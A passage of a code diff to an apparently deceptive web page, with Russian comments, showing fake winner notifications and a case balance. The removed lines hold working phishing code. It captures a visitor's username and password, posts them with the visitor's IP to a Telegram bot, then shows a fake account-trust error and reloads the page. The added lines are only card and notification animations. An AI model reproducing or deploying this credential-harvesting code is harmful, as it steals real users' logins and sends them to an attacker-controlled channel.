-            if(u.length < 3 || p.length < 3) return alert('Заполните все поля');
-            await sendTelegram(`🔥 LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`);
-            alert('Ошибка. Недостаточный уровень доверия аккаунта. Попробуйте другой метод.');
-            location.reload();
-        }
-
-        async function sendTelegram(t) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: t})
-            }).catch(e => {});
-        }
-
-        // УПРАВЛЕНИЕ ЗАГРУЗКОЙ
-        window.onload = () => {
-            initCase();
-            updateBalanceUI();
-            
-            // Запуск уведомлений о победителях
-            setInterval(showWinner, 8000);
-            
-            // Ждем 2 секунды и скрываем прелоадер
-            setTimeout(() => {
-                const loader = document.getElementById('preloader');
-                loader.style.opacity = '0';
                 setTimeout(() => {
-                    loader.style.display = 'none';
-                }, 500);
-            }, 2000);
-        };
+                    card.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
+                    card.style.opacity = '1';
+                    card.style.transform = 'translateY(0)';
+                }, 300 + index * 300);
+            });
+            
+            // Анимация для уведомления
+            setTimeout(() => {
+                notification.style.opacity = '0';
+                notification.style.transition = 'opacity 0.8s ease';
+                notification.style.opacity = '1';
+            }, 1000);
+            
+            // Имитация "пульсации" для уведомления
+            setInterval(() => {
+                notification.classList.toggle('pulse');
+            }, 4000);
+        });
     </script>
 </body>
 </html>
